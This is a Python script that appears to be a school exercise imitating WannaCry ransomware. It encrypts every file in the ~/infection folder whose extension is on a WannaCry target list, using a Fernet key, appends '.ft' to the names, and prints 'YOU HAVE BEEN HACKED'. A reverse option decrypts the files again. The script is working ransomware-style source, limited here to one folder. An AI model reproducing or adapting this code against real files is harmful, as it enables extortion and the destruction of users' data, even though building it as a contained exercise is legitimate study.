import argparse
import os
from cryptography.fernet import Fernet

FERNET_KEY = os.environ.get("FERNET_KEY")

def ft_stockholm(args):
    infection_dir = os.path.expanduser('~/infection')
    
    with open("WannaCry_file_ext.txt", 'r') as file:
        target_extentions = [line.strip() for line in file]

    if (os.path.exists(infection_dir) and os.path.isdir(infection_dir)):
        if args.reverse:
            for filename in os.listdir(infection_dir):
                if filename.endswith('.ft') and any(filename.split('.ft')[0].endswith(ext) for ext in target_extentions):
                    if not args.silent:
                        print(f"Processing file: {filename} .. ")
                    try:
                        with open(f"{infection_dir}/{filename}", 'r') as file:
                            data = file.read()
                    except Exception as e:
                        print(f"Failed to open file {filename}: {e}")
                    try:
                        cipher = Fernet(FERNET_KEY)
                        decrypted_data = cipher.decrypt(data)
                        try:
                            with open(f"{infection_dir}/{filename}", 'w') as file:
                                file.write(decrypted_data.decode())
                                os.rename(f"{infection_dir}/{filename}", f"{infection_dir}/{filename}".split('.ft')[0])
                        except Exception as e:
                            print(f"Failed to open file {filename}: {e}")
                    except Exception as e:
                        print(f"Failed to decrypt file {filename}: {e}")
            exit(print(f"YOU HAVE BEEN UNHACKED, WANNA CRY 🥺🥺🥺🥺🥺"))
        else:
            for filename in os.listdir(infection_dir):
                if any(filename.endswith(ext) for ext in target_extentions):
                    if not args.silent:
                        print(f"Processing file: {filename} .. ")
                    try:
                        with open(f"{infection_dir}/{filename}", 'r+') as file:
                            data = file.read()
                            try:
                                cipher = Fernet(FERNET_KEY)
                                encrypted_data = cipher.encrypt(data.encode())
                                file.seek(0)
                                file.write(encrypted_data.decode())
                                os.rename(f"{infection_dir}/{filename}", f"{infection_dir}/{filename}.ft")
                            except Exception as e:
                                print(f"Failed to encrypt file {filename} !!: {e}")
                    except Exception as e:
                        print(f"Failed to open file {filename} !!")
            exit(print(f"YOU HAVE BEEN HACKED, WANNA CRY 🥺🥺🥺🥺🥺"))
    else:
        exit(print("Nothing to do here!"))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="WannaCryyyyyy 🥺 ??")
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0.0')
    parser.add_argument('-s', '--silent', action='store_true', help='do not show encrypted files during the process')
    parser.add_argument('-r', '--reverse', type=str, help='reverse the infection')

    args = parser.parse_args()

    ft_stockholm(args)
